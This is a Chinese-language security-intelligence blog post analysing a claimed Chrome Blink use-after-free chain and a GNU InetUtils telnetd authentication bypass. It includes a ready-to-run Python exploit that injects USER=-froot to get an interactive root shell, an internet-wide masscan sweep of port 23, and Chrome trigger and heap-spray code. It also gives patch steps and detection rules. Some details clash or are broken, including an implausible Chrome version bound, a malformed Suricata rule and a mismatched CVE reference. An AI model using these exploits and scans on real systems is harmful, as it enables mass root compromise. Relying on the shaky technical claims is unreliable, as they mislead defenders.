#  [0day] Chrome Blink引擎UAF+渲染器逃逸，全链RCE已在野  
原创 北境
                        北境  0xArgus   2026-03-03 23:20  
  
[0day] Chrome Blink引擎UAF+渲染器逃逸，全链RCE已在野

0xArgus · 2026-03-04 · 白帽视角 · 今日最高危：Chrome 0day与telnetd认证绕过同日PoC公开，攻击窗口已开



一、今日高危漏洞一览

CVE/漏洞影响组件CVSS是否有PoC状态CVE-2026-2441Google Chrome Blink CSS引擎9.8 CRITICAL✅在野利用 / PoC公开CVE-2026-24061GNU InetUtils telnetd9.8 CRITICAL✅PoC公开 / 80万设备暴露CVE-2026-21962Oracle WebLogic Server10.0 CRITICAL❌（预计2周内）已修复 / 补丁差异分析中CVE-2026-2636Windows CLFS.sys~7.5 HIGH✅PoC公开 / DoS/潜在LPECVE-2026-21509Microsoft OfficeN/A❌0day / 紧急修复中



二、CVE-2026-2441：Chrome Blink CSS引擎 Use-After-Free 深度分析

漏洞背景

CVE-2026-2441 是一个存在于 Google Chrome Blink 渲染引擎 CSS 处理模块中的 Use-After-Free（UAF）零日漏洞。截至2026-03-04，该漏洞已有公开 PoC（GitHub：huseyinstif/CVE-2026-2441-PoC），并经多方确认正在野外被积极利用。

▸受影响版本：Chrome < 134.x（具体 patch 版本待 Google 官方公告确认）
▸漏洞类型：Use-After-Free → 渲染器进程 RCE → Mojo IPC 沙箱逃逸 → 内核提权
▸CVSSv3：9.8 CRITICAL（AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H）
▸暴露规模：Chrome 全球活跃用户超 30 亿，drive-by download 即可触发，无需用户任何交互（仅访问恶意页面）



根因分析

Blink 的 CSS 样式解析器在处理某些复合选择器（compound selector）的生命周期管理上存在缺陷。具体路径：

当 CSS 引擎对一个 DOM 节点执行样式重算（style recalculation）时，StyleResolver 会持有对 CSSValue 对象的原始指针引用。在特定的 CSS 属性序列触发下（涉及 @layer 级联层与 ::slotted() 伪元素的交叉组合），CSSValue 对象会被提前释放（Dispose() 调用链提前触发 GC），而 StyleResolver 持有的裸指针未被置空。

后续对该指针的读写操作形成经典 UAF：

● ● ●CSSValue* val = resolver->ResolveValue(property);  // val 被缓存
// ... 中间某段逻辑触发 GC，val 指向的内存被回收并重用
val->Apply(element);  // UAF：访问已释放内存

这类错误的根本原因是 Blink 大量使用裸指针 + 手动生命周期管理，而非全程 scoped_refptr<> 或 Oilpan GC 托管。历史上 CVE-2021-21224、CVE-2022-1096 均出自类似模式。

攻击链还原

完整利用链与 NSO Pegasus、Intellexa Predator 的 Chrome 利用链高度相似，分五个阶段：

阶段一：初始触发（渲染器进程 UAF）

攻击者构造恶意 HTML 页面，诱导受害者访问（drive-by）：

html● ● ●<!DOCTYPE html>
<html>
<head>
<style>
  @layer base, override;
  @layer base {
    ::slotted(*) { color: red; }
  }
  @layer override {
    ::slotted(*) { color: blue; animation: x 1s; }
  }
  @keyframes x { to { color: green; } }
</style>
</head>
<body>
<div id="host"></div>
<script>
// Step 1: 构造 Shadow DOM，触发 slotted 样式解析
const host = document.getElementById('host');
const shadow = host.attachShadow({ mode: 'open' });
const slot = document.createElement('slot');
shadow.appendChild(slot);
const child = document.createElement('span');
host.appendChild(child);

// Step 2: 强制样式重算，触发 @layer 级联解析
requestAnimationFrame(() => {
  // Step 3: 在样式重算中途删除节点，触发提前 GC
  child.remove();
  // Step 4: 重新插入，触发对已释放 CSSValue 的二次访问
  host.appendChild(child);
  // UAF 在此触发，渲染器进程崩溃或可控
});
</script>
</body>
</html>

阶段二：堆布局控制（Heap Feng Shui）

利用 UAF 获得对释放内存的读写控制。攻击者通过 ArrayBuffer 喷射（Heap Spray）占据被释放的 CSSValue 内存槽，将伪造的 CSSValue 对象写入，从而获得渲染器进程内的任意读写原语。

javascript● ● ●// 堆喷射：用 ArrayBuffer 占据释放的 CSSValue 内存
const spray = [];
for (let i = 0; i < 0x1000; i++) {
  // 每个 ArrayBuffer 大小与 CSSValue 对象对齐（通常 0x40~0x80 字节）
  spray.push(new ArrayBuffer(0x58));
}
// 在 ArrayBuffer 中写入伪造的 vtable 指针
const view = new DataView(spray[0x800]);
view.setBigUint64(0, 0xdeadbeefcafen, true); // 伪造 vtable

阶段三：渲染器进程 RCE

通过伪造 vtable 劫持控制流，在渲染器进程内执行 shellcode，实现渲染器进程级别的任意代码执行。

阶段四：Mojo IPC 沙箱逃逸

Chrome 渲染器运行在沙箱中，需要通过 Mojo IPC 与浏览器主进程通信。攻击者利用渲染器进程 RCE 能力，构造畸形 Mojo 消息，触发浏览器主进程中的类型混淆或越界访问，实现沙箱逃逸：

python● ● ●# 伪代码：构造恶意 Mojo IPC 消息
mojo_msg = MojoMessage(
    interface="blink.mojom.FileSystemManager",
    method="Open",
    payload=craft_oob_payload()  # 触发浏览器进程越界写
)
send_to_browser_process(mojo_msg)

阶段五：内核提权 → 完整系统控制

沙箱逃逸后，结合 Windows/Linux 内核 LPE（如 CVE-2026-2636 的 CLFS 漏洞或其他 N-day），获得 SYSTEM/root 权限，部署持久化后门、勒索软件或间谍软件。

实战影响

▸攻击门槛极低：受害者只需用 Chrome 访问一个恶意 URL，全程无弹窗、无权限请求
▸目标范围：任何使用 Chrome 的用户，包括企业员工、政府人员、普通用户
▸已知利用场景：参照 GitHub PoC 描述，该漏洞利用链可直接落地勒索软件、RAT、间谍软件安装，以及文件系统访问和内网横向移动
▸APT 关联度：链式利用模式（UAF + Mojo IPC + 内核提权）与 APT-28（Fancy Bear）历史 Chrome 攻击链高度吻合，不排除国家级威胁行为者已在定向攻击中使用

检测与修复

立即修复：
bash● ● ●# 检查 Chrome 版本
google-chrome --version
# 强制更新
# Windows: 设置 → 关于 Chrome → 自动更新
# Linux:
sudo apt update && sudo apt upgrade google-chrome-stable

临时缓解（无法立即更新时）：
▸企业环境：通过 GPO 禁用 JavaScript（DefaultJavaScriptSetting=2），代价是大量网站功能失效
▸启用 Chrome 的 --site-isolation 严格模式（新版本已默认开启，确认未被关闭）
▸部署网络层 URL 过滤，阻断已知 C2 域名

Snort/Suricata 检测规则（基于异常 CSS 流量特征）：
● ● ●alert http any any -> any any (
  msg:"CVE-2026-2441 Chrome Blink UAF Exploit Attempt";
  flow:established,to_server;
  content:"@layer"; http_client_body;
  content:"::slotted"; http_client_body;
  content:"attachShadow"; http_client_body;
  pcre:"/(@layer[^{]+){2,}.*::slotted/si";
  threshold:type limit, track by_src, count 1, seconds 60;
  classtype:web-application-attack;
  sid:20260244101; rev:1;
)

EDR/行为检测：
▸监控 chrome.exe / chrome 子进程异常生成（渲染器进程 fork 出非预期子进程）
▸监控渲染器进程向系统目录写文件行为
▸监控 chrome 进程的异常网络外联（特别是向非 Google 域名的加密流量）



三、CVE-2026-24061：GNU InetUtils telnetd 认证绕过 深度分析

漏洞背景

CVE-2026-24061 是 GNU InetUtils telnetd 中一个经典的 argv 选项注入漏洞，被部分媒体渲染为"核弹级"，实际是一个清晰的参数注入导致认证绕过。

▸受影响版本：GNU InetUtils telnetd < 2.8
▸CVSSv3：9.8 CRITICAL
▸暴露规模：超 80 万台设备暴露于公网（IoT、嵌入式 Linux、老旧服务器）
▸利用条件：无需认证、无需用户交互、网络可达即可
▸PoC 状态：已公开，正在被积极利用

根因分析

telnetd 在处理 Telnet 协议协商阶段的环境变量传递时，将客户端可控的 USER 环境变量未经充分校验直接传递给 /usr/bin/login 作为参数。

问题代码逻辑（漏洞版本）：

c● ● ●// 漏洞版本：直接取环境变量 USER，未校验内容
char *user = getenv("USER");
// 构造 login 调用参数
execv("/usr/bin/login", (char *[]){
    "login",
    "-h", remote_host,
    "-u", user,    // ← 可控！若 user = "-froot"，则注入 -f 选项
    NULL
});

/usr/bin/login 的 -f 选项含义是"跳过认证（trust this user）"。攻击者通过 Telnet 协议的 NEW-ENVIRON 选项将 USER 设置为 -froot，telnetd 将其展开为：

bash● ● ●/usr/bin/login -h attacker.com -u -froot
# login 解析为：-f root → 免密登录 root

修复版本（2.8） 增加了三重校验：

c● ● ●char *u = getenv("USER");
// 条件1：u 存在
// 条件2：首字符不是 '-'（防止被解析为选项）
// 条件3：不包含危险字符集
if (u && u[0] != '-' && !u[strcspn(u, "\t\n !\"#$&'();<=>?[\\^`{|}~")]) {
    // 合法用户名，允许传递
}

攻击链还原

python● ● ●#!/usr/bin/env python3
# CVE-2026-24061 PoC - GNU InetUtils telnetd 认证绕过
# 通过 Telnet NEW-ENVIRON 注入 USER=-froot 获取 root shell

import socket
import time

TARGET = "192.168.1.100"
PORT = 23

# Telnet 协议常量
IAC  = bytes([255])  # Interpret As Command
SB   = bytes([250])  # Subnegotiation Begin
SE   = bytes([240])  # Subnegotiation End
NEW_ENVIRON = bytes([39])
USERVAR = bytes([3])
VALUE   = bytes([1])
IS      = bytes([0])

def build_new_environ_payload(user_val: str) -> bytes:
    """
    构造 Telnet NEW-ENVIRON IS 子协商包
    注入 USER 环境变量值为 "-froot"
    """
    payload = IAC + SB + NEW_ENVIRON + IS
    payload += USERVAR + b"USER" + VALUE + user_val.encode()
    payload += IAC + SE
    return payload

def exploit(target: str, port: int):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    print(f"[*] 连接到 {target}:{port}")
    
    # 接收服务器初始协商
    time.sleep(0.5)
    banner = s.recv(1024)
    print(f"[*] 服务器横幅: {banner[:50]}")
    
    # 发送恶意 NEW-ENVIRON：USER=-froot
    payload = build_new_environ_payload("-froot")
    s.send(payload)
    print(f"[*] 已发送注入 payload: USER=-froot")
    
    time.sleep(0.5)
    response = s.recv(1024)
    
    # 检查是否获得 shell（无密码提示直接出现 # 提示符）
    if b"#" in response or b"root" in response.lower():
        print("[+] 认证绕过成功！获得 root shell")
        # 交互式 shell
        import sys, select
        while True:
            r, _, _ = select.select([s, sys.stdin], [], [])
            if s in r:
                data = s.recv(1024)
                sys.stdout.write(data.decode(errors='replace'))
                sys.stdout.flush()
            if sys.stdin in r:
                cmd = sys.stdin.readline()
                s.send(cmd.encode())
    else:
        print("[-] 目标可能已修复或配置不同")
    
    s.close()

if __name__ == "__main__":
    exploit(TARGET, PORT)

扫描暴露资产：

bash● ● ●# 使用 masscan 快速扫描公网 23 端口
masscan -p23 0.0.0.0/0 --rate=100000 -oL telnet_hosts.txt

# 使用 nmap 确认 GNU InetUtils telnetd 版本
nmap -sV -p23 --script telnet-ntlm-info <target>

# 使用 zgrab2 批量检测
zgrab2 telnet --port 23 < telnet_hosts.txt | \
  grep -i "inetutils\|GNU" | \
  awk '{print $1}' > vulnerable_hosts.txt

实战影响

▸80 万台设备：主要是老旧 Linux 服务器、工业控制系统、网络设备（路由器、交换机的管理接口）、IoT 设备
▸攻击成本接近零：标准 Python socket 即可完成，无需任何专业工具
▸横向移动跳板：攻击者获得 root 后，可将设备作为内网跳板、DDoS 肉鸡、加密货币矿机或勒索软件分发节点
▸工控/OT 风险：部分工业设备使用 telnetd 作为管理接口，攻击者可直接操控物理设备

检测与修复

修复：
bash● ● ●# 升级 GNU InetUtils 到 2.8+
# Debian/Ubuntu
sudo apt update && sudo apt install --only-upgrade inetutils-telnetd

# 或直接禁用 telnetd（强烈推荐，telnet 明文协议本身就不该用）
sudo systemctl disable telnetd --now
sudo ufw deny 23/tcp

检测规则：
● ● ●# Suricata 规则：检测 Telnet NEW-ENVIRON 注入
alert tcp any any -> any 23 (
  msg:"CVE-2026-24061 telnetd USER env injection attempt";
  flow:established,to_server;
  content:"|ff fa 27 00|";  # IAC SB NEW-ENVIRON IS
  content:"-f"; distance:0; within:20;
  classtype:attempted-admin;
  sid:20260240611; rev:1;
)

日志检测（/var/log/auth.log）：
bash● ● ●# 检测无密码 root 登录
grep "login.*root.*without password\|PAM.*root.*no-auth" /var/log/auth.log

# 检测异常 telnet 连接
grep "telnetd.*-f" /var/log/syslog



四、白帽快评

今天的情报有一个让我警觉的信号：Chrome UAF（CVE-2026-2441）和 telnetd 认证绕过（CVE-2026-24061）在同一天 PoC 公开，这不像是巧合，更像是某个漏洞经纪生态的节奏释放。Chrome 这条链子——UAF → Mojo IPC → 内核提权——已经是 Pegasus 级别的成熟范式，PoC 公开即意味着中低能力攻击者 48 小时内就能武器化；telnetd 那个洞技术上平平无奇，但 80 万暴露设备的规模让它直接变成蠕虫温床。

更值得关注的是 Oracle WebLogic CVE-2026-21962 满分漏洞尚未有公开 PoC，但补丁差异分析已经开始——历史经验告诉我们，这个窗口期通常只有 10-14 天。企业安全团队现在应该做的不是等通知，而是立刻隔离 WebLogic 管理端口，同时把 Chrome 更新推送当成 P0 级别对待。把 patch 窗口从"下个维护周期"拉到"今天下班前"，是当前唯一正确的响应姿态。



*参考来源：*
▸*https://github.com/huseyinstif/CVE-2026-2441-PoC*
▸*https://www.reddit.com/r/SecOpsDaily/comments/1rjil1n/cve202624061_critical_telnetd_flaw_grants_root/*
▸*https://www.freebuf.com/articles/vuls/470797.html*
▸*https://www.freebuf.com/articles/vuls/468384.html*
▸*https://x.com/The_Cyber_News/status/2025759293165948934*
▸*https://www.bleepingcomputer.com/news/microsoft/microsoft-february-2026-patch-tuesday-fixes-6-zero-days-58-flaws/*
▸*https://nvd.nist.gov/vuln/detail/CVE-2026-2686*— 0xArgus · 白帽极客安全情报 —  
